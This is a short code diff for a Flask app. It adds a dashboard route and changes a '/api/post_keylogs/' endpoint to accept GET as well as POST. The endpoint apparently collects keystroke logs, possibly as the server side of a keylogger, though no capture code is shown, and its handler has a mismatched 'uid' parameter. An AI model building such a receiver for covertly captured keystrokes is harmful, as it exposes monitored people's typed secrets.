@@ -3,7 +3,7 @@ from flask import render_template
 
 from decimal import *
 
-import simplejson
+# import simplejson
 
 app = Flask(__name__)
 
@@ -12,9 +12,14 @@ app = Flask(__name__)
 def cover():
     return render_template('index.html')
 
+@app.route('/dashboard')
+def dash():
+    return render_template('dashboard/index.html')
+
+
 
 # @app.route('/api/post_klogs/<uid>', methods=['POST'])
-@app.route('/api/post_keylogs/', methods=['POST'])
+@app.route('/api/post_keylogs/', methods=['GET','POST'])
 def add_message(uid):
     """
     check if valid uid, next of true
